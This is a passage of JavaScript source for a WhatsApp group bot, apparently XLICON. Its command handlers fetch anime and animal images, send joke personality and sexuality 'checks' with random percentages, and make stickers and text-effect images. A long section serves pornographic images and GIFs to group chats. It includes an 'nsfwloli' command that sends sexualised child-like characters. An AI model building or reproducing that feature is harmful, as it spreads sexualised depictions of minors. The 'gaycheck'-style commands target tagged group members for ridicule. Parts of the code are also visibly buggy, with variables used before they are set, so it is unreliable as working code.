          waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animenom":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animefoxgirl":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animetickle":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animegecg":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "dogwoof":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/woof`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "8ballpool":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/8ball`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "goosebird":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/goose`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animefeed":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/feed`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animeavatar":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "lizardpic":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/lizard`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "catmeow":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/meow`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "anime":
        {
          if (!text) return replygcXlicon(`Which anime are you lookin for?`);
          const malScraper = require("mal-scraper");
          await XliconStickWait();
          const anime = await malScraper
            .getInfoFromName(text)
            .catch(() => null);
          if (!anime) return replygcXlicon(`Could not find`);
          let animetxt = `
🎀 *Title: ${anime.title}*
🎋 *Type: ${anime.type}*
🎐 *Premiered on: ${anime.premiered}*
💠 *Total Episodes: ${anime.episodes}*
📈 *Status: ${anime.status}*
💮 *Genres: ${anime.genres}
📍 *Studio: ${anime.studios}*
🌟 *Score: ${anime.score}*
💎 *Rating: ${anime.rating}*
🏅 *Rank: ${anime.ranked}*
💫 *Popularity: ${anime.popularity}*
♦️ *Trailer: ${anime.trailer}*
🌐 *URL: ${anime.url}*
❄ *Description:* ${anime.synopsis}*`;
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: anime.picture }, caption: animetxt },
            { quoted: m }
          );
        }
        break;
      case "hentaivid":
      case "hentai":
      case "hentaivideo":
        {
          if (!m.isGroup) return XliconStickGroup();
          if (!AntiNsfw) return replygcXlicon(mess.nsfw);
          await XliconStickWait();
          const { hentai } = require("./lib/scraper.js");
          anu = await hentai();
          result912 = anu[Math.floor(Math.random(), anu.length)];
          XliconBotInc.sendMessage(
            m.chat,
            {
              video: { url: result912.video_1 },
              caption: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}`,
            },
            { quoted: m }
          );
        }
        break;
      case "trap":
        if (!m.isGroup) return XeonStickGroup();
        if (!AntiNsfw) return replygcXlicon(mess.nsfw);
        await XliconStickWait();
        waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: waifudd.data.url } },
          { quoted: m }
        );
        break;
      case "hentai-neko":
      case "hneko":
        if (!m.isGroup) return XeonStickGroup();
        if (!AntiNsfw) return replygcXlicon(mess.nsfw);
        waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: waifudd.data.url } },
          { quoted: m }
        );
        break;
      case "hentai-waifu":
      case "nwaifu":
        if (!m.isGroup) return XeonStickGroup();
        if (!AntiNsfw) return replygcXlicon(mess.nsfw);
        await XliconStickWait();
        waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: waifudd.data.url } },
          { quoted: m }
        );
        break;
      case "gasm":
        if (!m.isGroup) return XeonStickGroup();
        if (!AntiNsfw) return replygcXlicon(mess.nsfw);
        await XliconStickWait();
        waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: waifudd.data.url } },
          { quoted: m }
        );
        break;
      case "milf":
        if (!m.isGroup) return XeonStickGroup();
        await XliconStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/milf.json")
        );
        var xeonyresult = pickRandom(ahegaonsfw);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: xeonyresult.url } },
          { quoted: m }
        );
        break;
      case "animespank":
        if (!m.isGroup) return XeonStickGroup();
        if (!AntiNsfw) return replygcXlicon(mess.nsfw);
        await XliconStickWait();
        waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`);
        await XliconBotInc.sendMessage(
          m.chat,
          {
            caption: `➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�`,
            image: { url: waifudd.data.url },
          },
          { quoted: m }
        ).catch((err) => {
          return "Error!";
        });
        break;
      case "ahegao":
        if (!m.isGroup) return XeonStickGroup();
        if (!AntiNsfw) return replygcXlicon(mess.nsfw);
        await XliconStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/ahegao.json")
        );
        var xeonyresult = pickRandom(ahegaonsfw);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: xeonyresult.url } },
          { quoted: m }
        );
        break;
      case "ass":
        if (!m.isGroup) return XeonStickGroup();
        if (!AntiNsfw) return replygcXlicon(mess.nsfw);
        await XliconStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/ass.json")
        );
        var xeonyresult = pickRandom(ahegaonsfw);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: xeonyresult.url } },
          { quoted: m }
        );
        break;
      case "bdsm":
        if (!m.isGroup) return XeonStickGroup();
        if (!AntiNsfw) return replygcXlicon(mess.nsfw);
        await XliconStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/bdsm.json")
        );
        var xeonyresult = pickRandom(ahegaonsfw);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: xeonyresult.url } },
          { quoted: m }
        );
        break;
      case "blowjob":
        if (!m.isGroup) return XeonStickGroup();
        if (!AntiNsfw) return replygcXlicon(mess.nsfw);
        await XliconStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/blowjob.json")
        );
        var xeonyresult = pickRandom(ahegaonsfw);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: xeonyresult.url } },
          { quoted: m }
        );
        break;
      case "cuckold":
        if (!m.isGroup) return XeonStickGroup();
        if (!AntiNsfw) return replygcXlicon(mess.nsfw);
        await XliconStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/cuckold.json")
        );
        var xeonyresult = pickRandom(ahegaonsfw);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: xeonyresult.url } },
          { quoted: m }
        );
        break;
      case "cum":
        if (!m.isGroup) return XeonStickGroup();
        if (!AntiNsfw) return replygcXlicon(mess.nsfw);
        await XliconStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/cum.json")
        );
        var xeonyresult = pickRandom(ahegaonsfw);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: xeonyresult.url } },
          { quoted: m }
        );
        break;
      case "eba":
        if (!m.isGroup) return XeonStickGroup();
        if (!AntiNsfw) return replygcXlicon(mess.nsfw);
        await XliconStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/eba.json")
        );
        var xeonyresult = pickRandom(ahegaonsfw);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: xeonyresult.url } },
          { quoted: m }
        );
        break;
      case "ero":
        if (!m.isGroup) return XeonStickGroup();
        if (!AntiNsfw) return replygcXlicon(mess.nsfw);
        await XliconStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/ero.json")
        );
        var xeonyresult = pickRandom(ahegaonsfw);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: xeonyresult.url } },
          { quoted: m }
        );
        break;
      case "femdom":
        if (!m.isGroup) return XeonStickGroup();
        if (!AntiNsfw) return replygcXlicon(mess.nsfw);
        await XliconStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/femdom.json")
        );
        var xeonyresult = pickRandom(ahegaonsfw);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: xeonyresult.url } },
          { quoted: m }
        );
        break;
      case "foot":
        if (!m.isGroup) return XeonStickGroup();
        if (!AntiNsfw) return replygcXlicon(mess.nsfw);
        await XliconStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/foot.json")
        );
        var xeonyresult = pickRandom(ahegaonsfw);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: xeonyresult.url } },
          { quoted: m }
        );
        break;
      case "gangbang":
        if (!m.isGroup) return XeonStickGroup();
        if (!AntiNsfw) return replygcXlicon(mess.nsfw);
        await XliconStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/gangbang.json")
        );
        var xeonyresult = pickRandom(ahegaonsfw);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: xeonyresult.url } },
          { quoted: m }
        );
        break;
      case "glasses":
        if (!m.isGroup) return XeonStickGroup();
        if (!AntiNsfw) return replygcXlicon(mess.nsfw);
        await XliconStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/glasses.json")
        );
        var xeonyresult = pickRandom(ahegaonsfw);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: xeonyresult.url } },
          { quoted: m }
        );
        break;
      case "hentai":
        if (!m.isGroup) return XeonStickGroup();
        if (!AntiNsfw) return replygcXlicon(mess.nsfw);
        await XliconStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/hentai.json")
        );
        var xeonyresult = pickRandom(ahegaonsfw);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: xeonyresult.url } },
          { quoted: m }
        );
        break;
      case "jahy":
        if (!m.isGroup) return XeonStickGroup();
        if (!AntiNsfw) return replygcXlicon(mess.nsfw);
        await XliconStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/jahy.json")
        );
        var xeonyresult = pickRandom(ahegaonsfw);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: xeonyresult.url } },
          { quoted: m }
        );
        break;
      case "manga":
        if (!m.isGroup) return XeonStickGroup();
        if (!AntiNsfw) return replygcXlicon(mess.nsfw);
        await XliconStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/manga.json")
        );
        var xeonyresult = pickRandom(ahegaonsfw);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: xeonyresult.url } },
          { quoted: m }
        );
        break;
      case "masturbation":
        if (!m.isGroup) return XeonStickGroup();
        if (!AntiNsfw) return replygcXlicon(mess.nsfw);
        await XliconStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/masturbation.json")
        );
        var xeonyresult = pickRandom(ahegaonsfw);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: xeonyresult.url } },
          { quoted: m }
        );
        break;
      case "neko-hentai":
        if (!m.isGroup) return XeonStickGroup();
        if (!AntiNsfw) return replygcXlicon(mess.nsfw);
        await XliconStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/neko.json")
        );
        var xeonyresult = pickRandom(ahegaonsfw);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: xeonyresult.url } },
          { quoted: m }
        );
        break;
      case "neko-hentai2":
        if (!m.isGroup) return XeonStickGroup();
        if (!AntiNsfw) return replygcXlicon(mess.nsfw);
        await XliconStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/neko2.json")
        );
        var xeonyresult = pickRandom(ahegaonsfw);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: xeonyresult.url } },
          { quoted: m }
        );
        break;
      case "nsfwloli":
        if (!m.isGroup) return XeonStickGroup();
        if (!AntiNsfw) return replygcXlicon(mess.nsfw);
        await XliconStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/nsfwloli.json")
        );
        var xeonyresult = pickRandom(ahegaonsfw);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: xeonyresult.url } },
          { quoted: m }
        );
        break;
      case "orgy":
        if (!m.isGroup) return XeonStickGroup();
        if (!AntiNsfw) return replygcXlicon(mess.nsfw);
        await XliconStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/orgy.json")
        );
        var xeonyresult = pickRandom(ahegaonsfw);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: xeonyresult.url } },
          { quoted: m }
        );
        break;
      case "panties":
        if (!m.isGroup) return XeonStickGroup();
        if (!AntiNsfw) return replygcXlicon(mess.nsfw);
        await XliconStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/panties.json")
        );
        var xeonyresult = pickRandom(ahegaonsfw);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: xeonyresult.url } },
          { quoted: m }
        );
        break;
      case "pussy":
        if (!m.isGroup) return XeonStickGroup();
        if (!AntiNsfw) return replygcXlicon(mess.nsfw);
        await XliconStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/pussy.json")
        );
        var xeonyresult = pickRandom(ahegaonsfw);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: xeonyresult.url } },
          { quoted: m }
        );
        break;
      case "tentacles":
        if (!m.isGroup) return XeonStickGroup();
        if (!AntiNsfw) return replygcXlicon(mess.nsfw);
        await XliconStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/tentacles.json")
        );
        var xeonyresult = pickRandom(ahegaonsfw);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: xeonyresult.url } },
          { quoted: m }
        );
        break;
      case "thighs":
        if (!m.isGroup) return XeonStickGroup();
        if (!AntiNsfw) return replygcXlicon(mess.nsfw);
        await XliconStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/thighs.json")
        );
        var xeonyresult = pickRandom(ahegaonsfw);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: xeonyresult.url } },
          { quoted: m }
        );
        break;
      case "yuri":
        if (!m.isGroup) return XeonStickGroup();
        if (!AntiNsfw) return replygcXlicon(mess.nsfw);
        await XliconStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/yuri.json")
        );
        var xeonyresult = pickRandom(ahegaonsfw);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: xeonyresult.url } },
          { quoted: m }
        );
        break;
      case "zettai":
        if (!m.isGroup) return XeonStickGroup();
        if (!AntiNsfw) return replygcXlicon(mess.nsfw);
        await XliconStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/zettai.json")
        );
        var xeonyresult = pickRandom(ahegaonsfw);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: xeonyresult.url } },
          { quoted: m }
        );
        break;
      case "gifblowjob":
        if (!m.isGroup) return XeonStickGroup();
        if (!AntiNsfw) return replygcXlicon(mess.nsfw);
        await XliconStickWait();
        let assss = await axios.get("https://api.waifu.pics/nsfw/blowjob");
        var bobuff = await fetchBuffer(assss.data.url);
        var bogif = await buffergif(bobuff);
        await XliconBotInc.sendMessage(
          m.chat,
          { video: bogif, gifPlayback: true },
          { quoted: m }
        ).catch((err) => {});
        break;
      case "gifhentai":
        if (!m.isGroup) return XeonStickGroup();
        if (!AntiNsfw) return replygcXlicon(mess.nsfw);
        await XliconStickWait();
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/gifs.json")
        );
        var xeonyresultx = pickRandom(ahegaonsfw);
        await XliconBotInc.sendMessage(
          m.chat,
          { video: xeonyresultx, gifPlayback: true },
          { quoted: m }
        ).catch((err) => {});
        break;
      case "gifs":
      case "foot":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!AntiNsfw) return replygcXlicon(mess.nsfw);
          await XliconStickWait();
          let heyy;
          let yeha = heyy[Math.floor(Math.random() * heyy.length)];
          if (/gifs/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gifs.json"
            );
          if (/foot/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/foot.json"
            );
          XliconBotInc.sendMessage(
            m.chat,
            { image: { url: yeha }, caption: mess.success },
            { quoted: m }
          );
        }
        break;
      case "checkme":
        neme = args.join(" ");
        bet = `${sender}`;
        var sifat = [
          "Fine",
          "Unfriendly",
          "Chapri",
          "Nibba/nibbi",
          "Annoying",
          "Dilapidated",
          "Angry person",
          "Polite",
          "Burden",
          "Great",
          "Cringe",
          "Liar",
        ];
        var hoby = [
          "Cooking",
          "Dancing",
          "Playing",
          "Gaming",
          "Painting",
          "Helping Others",
          "Watching anime",
          "Reading",
          "Riding Bike",
          "Singing",
          "Chatting",
          "Sharing Memes",
          "Drawing",
          "Eating Parents Money",
          "Playing Truth or Dare",
          "Staying Alone",
        ];
        var cakep = ["Yes", "No", "Very Ugly", "Very Handsome"];
        var wetak = [
          "Caring",
          "Generous",
          "Angry person",
          "Sorry",
          "Submissive",
          "Fine",
          "Im sorry",
          "Kind Hearted",
          "Patient",
          "UwU",
          "Top",
          "Helpful",
        ];

        var sipat = sifat[Math.floor(Math.random() * sifat.length)];
        var biho = hoby[Math.floor(Math.random() * hoby.length)];
        var bhucin = getRandomNumber(0, 100);
        var senga = getRandomNumber(0, 100);
        var chakep = cakep[Math.floor(Math.random() * cakep.length)];
        var watak = wetak[Math.floor(Math.random() * wetak.length)];
        var baik = getRandomNumber(0, 100);
        var burug = getRandomNumber(0, 100);
        var cerdas = getRandomNumber(0, 100);
        var berani = getRandomNumber(0, 100);
        var takut = getRandomNumber(0, 100);
        profile = `*≡══《 Check @${bet.split("@")[0]} 》══≡*

*Name :* ${pushname}
*Characteristic :* ${sipat}
*Hobby :* ${biho}
*Simp :* ${bhucin}%
*Great :* ${senga}%
*Handsome :* ${chakep}
*Character :* ${watak}
*Good Morals :* ${baik}%
*Bad Morals :* ${burug}%
*Intelligence :* ${cerdas}%
*Courage :* ${berani}%
*Afraid :* ${takut}%

*≡═══《 CHECK PROPERTIES 》═══≡*`;
        try {
          ppuser = await XliconBotInc.profilePictureUrl(m.sender, "image");
        } catch (err) {
          ppuser =
            "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
        }
        ppxeon = await getBuffer(ppuser);
        XliconBotInc.sendMessage(
          from,
          { image: ppxeon, caption: profile, mentions: [bet] },
          { quoted: m }
        );
        break;

      case "charactercheck":
        if (!text)
          return replygcXlicon(
            `Tag Someone, Example : ${prefix + command} @Xeon`
          );
        const xeony = [
          "Compassionate",
          "Generous",
          "Grumpy",
          "Forgiving",
          "Obedient",
          "Good",
          "Simp",
          "Kind-Hearted",
          "patient",
          "UwU",
          "top, anyway",
          "Helpful",
        ];
        const taky = xeony[Math.floor(Math.random() * xeony.length)];
        XliconBotInc.sendMessage(
          from,
          { text: `Character Check : ${q}\nAnswer : *${taky}*` },
          { quoted: m }
        );
        break;
      case "stupidcheck":
      case "uncleancheck":
      case "hotcheck":
      case "smartcheck":
      case "evilcheck":
      case "dogcheck":
      case "coolcheck":
      case "waifucheck":
      case "handsomecheck":
      case "beautifulcheck":
      case "awesomecheck":
      case "greatcheck":
      case "gaycheck":
      case "cutecheck":
      case "lesbiancheck":
      case "hornycheck":
      case "prettycheck":
      case "lovelycheck":
      case "uglycheck":
        if (!m.isGroup) return XeonStickGroup();
        const cex = body.slice(0);
        const cek2 = getRandomNumber(0, 100);
        if (mentionByReply) {
          XliconBotInc.sendMessage(
            from,
            {
              text:
                "Question : *" +
                cex +
                "*\nChecker : " +
                `@${mentionByReply.split("@")[0]}` +
                "\nAnswer : " +
                cek2 +
                "%",
              mentions: [mentionByReply],
            },
            { quoted: m }
          );
        } else if (mentionByTag[0] && isGroup) {
          XliconBotInc.sendMessage(
            from,
            {
              text:
                "Question : *" +
                cex +
                "*\nChecker : " +
                `@${mentionByTag[0].split("@")[0]}` +
                "\nAnswer : " +
                cek2 +
                "%",
              mentions: [mentionByTag[0]],
            },
            { quoted: m }
          );
        } else if (!mentionByReply && !mentionByTag[0]) {
          XliconBotInc.sendMessage(
            from,
            {
              text:
                "Question : *" +
                cex +
                "*\nChecker : " +
                `@${sender.split("@")[0]}` +
                "\nAnswer : " +
                cek2 +
                "%",
              mentions: [sender],
            },
            { quoted: m }
          );
        }
        break;
      case "patrick":
      case "patricksticker":
        {
          var ano = await fetchJson(
            "https://raw.githubusercontent.com/DGXeon/XeonMedia/main/patrick"
          );
          var wifegerak = ano.split("\n");
          var wifegerakx =
            wifegerak[Math.floor(Math.random() * wifegerak.length)];
          encmedia = await XliconBotInc.sendImageAsSticker(
            from,
            wifegerakx,
            m,
            { packname: global.packname, author: global.author }
          );
        }
        break;
      case "dogesticker":
      case "dogestick":
      case "doge":
        {
          var ano = await fetchJson(
            "https://raw.githubusercontent.com/DGXeon/XeonMedia/main/doge"
          );
          var wifegerak = ano.split("\n");
          var wifegerakx =
            wifegerak[Math.floor(Math.random() * wifegerak.length)];
          encmedia = await XliconBotInc.sendImageAsSticker(
            from,
            wifegerakx,
            m,
            { packname: global.packname, author: global.author }
          );
        }
        break;
      case "lovesticker":
      case "lovestick":
        {
          var ano = await fetchJson(
            "https://raw.githubusercontent.com/DGXeon/XeonMedia/main/love"
          );
          var wifegerak = ano.split("\n");
          var wifegerakx =
            wifegerak[Math.floor(Math.random() * wifegerak.length)];
          encmedia = await XliconBotInc.sendImageAsSticker(
            from,
            wifegerakx,
            m,
            { packname: global.packname, author: global.author }
          );
        }
        break;
      case "gura":
      case "gurastick":
        {
          var ano = await fetchJson(
            "https://raw.githubusercontent.com/DGXeon/XeonMedia/main/gura"
          );
          var wifegerak = ano.split("\n");
          var wifegerakx =
            wifegerak[Math.floor(Math.random() * wifegerak.length)];
          encmedia = await XliconBotInc.sendImageAsSticker(
            from,
            wifegerakx,
            m,
            { packname: global.packname, author: global.author }
          );
        }
        break;
      case "telestick":
        {
          if (m.isGroup) return XliconStickPrivate();
          if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
            let xeonresources = await Telesticker(args[0]);
            await replygcXlicon(`Sending ${xeonresources.length} stickers...`);
            if (m.isGroup && xeonresources.length > 30) {
              await replygcXlicon(
                "Number of stickers more than 30, bot will send it in private chat."
              );
              for (let i = 0; i < xeonresources.length; i++) {
                XliconBotInc.sendMessage(m.sender, {
                  sticker: { url: xeonresources[i].url },
                });
              }
            } else {
              for (let i = 0; i < xeonresources.length; i++) {
                XliconBotInc.sendMessage(m.chat, {
                  sticker: { url: xeonresources[i].url },
                });
              }
            }
          } else
            replygcXlicon(
              `Where is the telegram sticker link?\nExample. ${
                prefix + command
              } https://t.me/addstickers/FriendlyDeath`
            );
        }
        break;
      case "shadow":
      case "write":
      case "romantic":
      case "burnpaper":
      case "smoke":
      case "narutobanner":
      case "love":
      case "undergrass":
      case "doublelove":
      case "coffecup":
      case "underwaterocean":
      case "smokyneon":
      case "starstext":
      case "rainboweffect":
      case "balloontext":
      case "metalliceffect":
      case "embroiderytext":
      case "flamingtext":
      case "stonetext":
      case "writeart":
      case "summertext":
      case "wolfmetaltext":
      case "nature3dtext":
      case "rosestext":
      case "naturetypography":
      case "quotesunder":
      case "shinetext":
        {
          if (!q)
            return replygcXlicon(`Example : ${prefix + command} SalmanSer`);
          await XliconStickWait();
          const photooxy = require("./lib/photooxy");
          let link;
          if (/stonetext/.test(command))
            link =
              "https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html";
          if (/writeart/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html";
          if (/summertext/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html";
          if (/wolfmetaltext/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html";
          if (/nature3dtext/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html";
          if (/rosestext/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html";
          if (/naturetypography/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html";
          if (/quotesunder/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html";
          if (/shinetext/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html";
          if (/shadow/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html";
          if (/write/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html";
          if (/romantic/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html";
          if (/burnpaper/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html";
          if (/smoke/.test(command))
            link =
              "https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html";
          if (/narutobanner/.test(command))
            link =
              "https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html";
          if (/love/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html";
          if (/undergrass/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html";
          if (/doublelove/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/love-text-effect-372.html";
          if (/coffecup/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html";
          if (/underwaterocean/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html";
          if (/smokyneon/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html";
          if (/starstext/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html";
          if (/rainboweffect/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html";
          if (/balloontext/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html";
          if (/metalliceffect/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html";
          if (/embroiderytext/.test(command))
